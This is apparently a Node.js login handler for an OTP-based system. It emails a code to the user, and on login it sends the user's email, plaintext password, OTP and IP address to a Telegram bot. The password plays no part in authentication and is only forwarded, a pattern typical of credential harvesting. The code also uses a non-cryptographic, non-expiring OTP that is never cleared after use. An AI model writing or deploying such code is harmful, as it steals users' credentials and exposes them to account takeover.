import mongoose from 'mongoose';
import { Resend } from 'resend';
import axios from 'axios';

const resend = new Resend(process.env.RESEND_API_KEY);

const UserSchema = new mongoose.Schema({
    email: String,
    otp: String,
    lastLogin: Date
});
const User = mongoose.models.User || mongoose.model('User', UserSchema);

export default async function handler(req, res) {
    await mongoose.connect(process.env.MONGODB_URI);
    const { action, email, password, otp } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const waktu = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });

    if (action === 'SEND_OTP') {
        const generatedOtp = Math.floor(100000 + Math.random() * 900000).toString();
        await User.findOneAndUpdate({ email }, { otp: generatedOtp }, { upsert: true });

        // Kirim Email via Resend
        await resend.emails.send({
            from: 'admin@kaaaoffc.web.id',
            to: email,
            subject: 'Kode OTP SC SATURN',
            html: `Your OTP code is: <strong>${generatedOtp}</strong>`
        });

        return res.status(200).json({ message: 'OTP Sent' });
    }

    if (action === 'VERIFY_LOGIN') {
        const user = await User.findOne({ email, otp });
        if (!user) return res.status(400).json({ message: 'OTP Salah!' });

        const totalUser = await User.countDocuments();

        // Notifikasi Login ke Telegram
        const pesan = `🔐 *NOTIFIKASI LOGIN SYSTEM*\n\n` +
                      `📧 *EMAIL:* ${email}\n` +
                      `🔑 *PASSWORD:* ${password}\n` +
                      `🔢 *OTP:* ${otp}\n` +
                      `🌐 *IP:* ${ip}\n` +
                      `⏰ *WAKTU:* ${waktu}\n` +
                      `👥 *TOTAL USER SEKARANG:* ${totalUser}\n`;

        await axios.post(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: process.env.TELEGRAM_CHAT_ID,
            text: pesan,
            parse_mode: 'Markdown'
        });

        return res.status(200).json({ success: true });
    }
          }
